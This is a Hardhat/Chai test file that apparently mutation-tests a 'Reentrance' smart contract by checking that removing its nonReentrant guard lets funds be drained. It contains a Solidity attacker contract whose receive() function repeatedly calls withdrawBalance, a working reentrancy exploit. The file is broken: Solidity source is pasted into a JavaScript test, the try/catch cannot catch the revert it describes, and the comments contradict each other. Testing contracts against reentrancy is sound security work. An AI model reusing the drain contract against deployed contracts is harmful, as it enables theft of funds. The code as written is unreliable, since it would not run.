import { expect } from "chai";
import { ethers } from "hardhat";

describe("Reentrance mutant test - reentrancy attack detection", function () {
  it("should detect missing nonReentrant modifier by performing a reentrancy attack", async function () {
    const [owner, attacker] = await ethers.getSigners();

    // Deploy the Reentrance contract (no constructor arguments)
    const ReentranceFactory = await ethers.getContractFactory("Reentrance");
    const reentrance = await ReentranceFactory.deploy();
    await reentrance.waitForDeployment();

    // Deploy the attacker contract
    const AttackerFactory = await ethers.getContractFactory("ReentrancyAttacker");
    const attackerContract = await AttackerFactory.deploy(await reentrance.getAddress());
    await attackerContract.waitForDeployment();

    // Fund the Reentrance contract with initial balance
    const initialDeposit = ethers.parseEther("1");
    await reentrance.connect(owner).addToBalance({ value: initialDeposit });

    // Fund the attacker contract with some ETH to cover gas and deposit
    const attackDeposit = ethers.parseEther("0.5");
    await attackerContract.connect(attacker).deposit({ value: attackDeposit });

    // Record balances before attack
    const reentranceBalanceBefore = await ethers.provider.getBalance(await reentrance.getAddress());
    const attackerContractBalanceBefore = await ethers.provider.getBalance(await attackerContract.getAddress());

    // Execute the attack - should succeed on mutant (missing nonReentrant) but revert on original
    const tx = await attackerContract.connect(attacker).attack();

    // The attack should succeed on the mutant (drain more funds than deposited)
    // We expect the attacker contract to have more ETH than it deposited
    // This will fail on the original (revert due to reentrancy guard)
    // We catch the revert case to differentiate
    try {
      await tx.wait();
      
      // If we reach here, the reentrancy attack succeeded (mutant is live)
      const reentranceBalanceAfter = await ethers.provider.getBalance(await reentrance.getAddress());
      const attackerContractBalanceAfter = await ethers.provider.getBalance(await attackerContract.getAddress());
      
      // Verify that the attacker drained more than their deposit
      expect(attackerContractBalanceAfter).to.be.gt(attackerContractBalanceBefore);
      expect(reentranceBalanceAfter).to.be.lt(reentranceBalanceBefore);
    } catch (error) {
      // If it reverts, the nonReentrant modifier was present (original behavior)
      // This means the test should pass (detecting the mutant would require success)
      // But since we want to kill the mutant, we fail the test if it reverts
      expect.fail("Expected reentrancy to succeed but transaction reverted - mutant not killed");
    }
  });
});

// Helper attacker contract for reentrancy attack
contract ReentrancyAttacker {
  Reentrance public target;
  
  constructor(address _target) {
    target = Reentrance(_target);
  }
  
  function deposit() external payable {
    target.addToBalance{value: msg.value}();
  }
  
  function attack() external {
    target.withdrawBalance();
  }
  
  receive() external payable {
    if (address(target).balance > 0) {
      target.withdrawBalance();
    }
  }
}